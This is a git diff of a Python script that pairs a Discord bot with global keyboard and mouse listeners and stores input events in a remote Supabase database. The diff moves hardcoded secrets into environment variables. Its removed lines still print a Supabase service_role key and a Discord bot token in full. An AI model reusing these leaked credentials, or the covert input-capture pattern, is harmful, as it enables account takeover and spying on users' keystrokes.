@@ -1,14 +1,18 @@
+import os
+from time import sleep
+
 import discord
 from discord.ext import commands
 from pynput.mouse import Listener as MouseListener
 from pynput.keyboard import Listener as KeyboardListener, Key
 from supabase import create_client, Client
+from dotenv import load_dotenv
 
+load_dotenv()
 url = "https://gurjbecyjphjhrhihnwv.supabase.co"
-key = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1cmpiZWN5anBoamhyaGlobnd2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTA2NDI3NSwiZXhwIjoyMDYwNjQwMjc1fQ.ITRY-7aTl_M8eltm_MacrD_t3JeC2MBVBEzF8ae6J-g")
+key = os.getenv("SP_API_KEY")
 supabase: Client = create_client(url, key)
 
-Token = 'MTM1ODczMDgxMjc5MDU0MjUzOA.Gr_mia.dRTSiWvlsJ5CZzYgh7orLtr22f_HJkRzlMeRAo'
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -76,7 +80,7 @@ async def fetch_users(ctx):
 
     for key in keys:
         create = key.get("created_at", "Brak daty")
-        click = key.get("data", "Brak przycisku")
+        click = key.get("Data", "Brak przycisku")
         line = f"- {create}, {click}\n"
 
         # Jeśli nowa linijka spowoduje przekroczenie limitu
@@ -128,11 +132,15 @@ async def fetch_users(ctx):
     for msg in messages_to_send:
         await ctx.send(msg)
 
+Token = os.getenv("DC_API_KEY")
 keyboard_listener = KeyboardListener(on_press=on_press)
 mouse_listener = MouseListener(on_click=on_click)
 
-bot.run(Token)
+
 keyboard_listener.start()
 mouse_listener.start()
+
+bot.run(Token)
+
 keyboard_listener.join()
 mouse_listener.join()
